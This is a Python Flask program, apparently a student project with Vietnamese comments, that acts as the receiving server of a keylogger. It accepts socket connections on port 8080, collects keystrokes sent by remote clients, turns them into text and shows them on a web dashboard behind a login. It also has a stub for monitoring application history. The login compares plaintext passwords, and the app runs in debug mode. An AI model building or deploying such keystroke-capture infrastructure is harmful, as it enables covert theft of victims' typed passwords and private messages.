import socket
from flask import Flask, request, render_template
import sqlite3
import threading

app = Flask(__name__)
is_logged_in = False
data_received = ""  

def handle_client(client_socket,client_address):
    global data_received  
    while True:
        try:
            # client_socket, client_address = server_socket.accept()
            print('Nhận kết nối từ', client_address)
            client_socket.send('keylogger'.encode('utf-8'))

            while True:
                data = client_socket.recv(1024)
                if not data:
                    break

                data = data.decode('utf-8')
                data = data.replace("'b'", "")
                data = data.replace("'", "")

                if data == "Key.backspace":
                    data = "back"
                elif data == "Key.f12":
                    break
                else:
                    if data == "Key.shift":
                        data = ""
                    if data == "Key.ctrl_l":
                        data = ""
                    if data == "Key.alt_l":
                        data = ""
                    if data == "Key.tab":
                        data = "\t"
                    if data == "Key.enter":
                        data = "\n"
                    if data == "Key.space":
                        data = "_"
                    else:
                        data = data.replace("Key.", "")

                data_received += data
                print(data, end="")

        except Exception as e:
            print("Error:", str(e))
            client_socket.close()
            break
        finally:
            client_socket.close()
            
def start_socket_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 8080

    try:
        server_socket.bind(('', port))
        server_socket.listen(5)
        print(f"Server listening on port {port}")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Got connection from {client_address}")

            # Tạo một luồng mới để xử lý kết nối của client
            client_thread = threading.Thread(
                target=handle_client,
                args=(client_socket, client_address)
            )
            client_thread.start()

    except Exception as e:
        print(f"Server error: {str(e)}")
    finally:
        server_socket.close()
        
@app.route('/', methods=['GET', 'POST'])
def login():
    global is_logged_in  # Declare is_logged_in as a global variable

    if request.method == 'POST':
        username = request.form['name']
        password = request.form['pass']

        # Kết nối đến cơ sở dữ liệu SQLite
        conn = sqlite3.connect('PBL.db')
        cursor = conn.cursor()

        # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
        query = "SELECT * FROM user WHERE username = ? AND password = ?"
        try:
            # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
            cursor.execute(query, (username, password))

            # Kiểm tra xem có người dùng hợp lệ trong cơ sở dữ liệu không
            user = cursor.fetchone()

            # Đóng kết nối đến cơ sở dữ liệu
            conn.close()

            if user:
                is_logged_in = True
                # threading.Thread(target=handle_client).start()
                socket_server_thread = threading.Thread(target=start_socket_server)
                socket_server_thread.start()
                return render_template('index.html', is_logged_in=is_logged_in)
            
            else:
                return "Đăng nhập không thành công. Vui lòng kiểm tra lại tên người dùng và mật khẩu."

        except Exception as e:
            return "Đã xảy ra lỗi: " + str(e)
    return render_template('login.html')

@app.route('/keylogger')
def keylogger_router():
    return render_template('keylogger.html', data_received=data_received)

@app.route('/app-history')
def appHistory():
    # Xử lý logic cho chức năng "Giám sát lịch sử ứng dụng" ở đây
    return render_template('app-history.html')  

if __name__ == '__main__':
    app.run(debug=True, port=8000)
